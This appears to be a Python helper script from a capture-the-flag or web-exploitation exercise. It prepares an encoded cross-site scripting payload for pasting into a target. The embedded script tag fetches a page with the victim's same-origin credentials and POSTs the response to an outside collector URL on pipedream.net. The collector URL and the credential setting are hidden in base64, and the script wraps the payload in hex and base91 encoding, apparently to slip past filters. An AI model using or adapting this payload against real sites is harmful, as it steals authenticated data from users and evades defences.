import re
import based91

text = b"""<script>fetch(`/e/42aa38f28e491bc169f1a013691f60b91d7a9f34`,{method:`GET`,credentials:atob(`c2FtZS1vcmlnaW4=`)})[`then`](resp=>resp[`text`]())[`then`](resp=>{fetch(atob(`aHR0cHM6Ly9lbno5bW4wZGMyemNiLngucGlwZWRyZWFtLm5ldA==`),{method:`POST`,body:resp})
})</script>>#""".hex()

print("[+] text here:", text)

# Convert hex to bytes only if the text is valid hex
text_bytes = (
    bytes.fromhex(text)
    if (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0)
    else text.encode()
)

print("[+] input", text_bytes)

# Decode with base91
decoded_payload = based91.decode(text_bytes.decode())

print("[!] copy this\n\n")
print("[+] Decoded:", decoded_payload.hex())
print("\n\n")

# Encode with base91
encoded_payload = based91.encode(decoded_payload)
print("[+] Encoded:", encoded_payload)

# Compare
print(encoded_payload.encode() == text_bytes)
